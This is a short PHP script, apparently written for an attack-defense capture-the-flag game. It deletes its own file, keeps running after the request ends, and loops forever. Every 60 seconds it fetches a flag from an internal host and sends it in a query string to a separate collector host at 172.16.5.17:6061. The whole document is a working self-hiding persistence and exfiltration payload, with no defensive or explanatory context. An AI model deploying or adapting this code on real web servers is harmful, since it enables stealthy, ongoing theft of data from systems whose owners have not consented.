<?php
$flagUrl='http://10.0.0.2';
$host='http://172.16.5.17:6061';

unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=file_get_contents($flagUrl);
    file_get_contents($host.'/?f='.$f);
    sleep(60);
}
?>
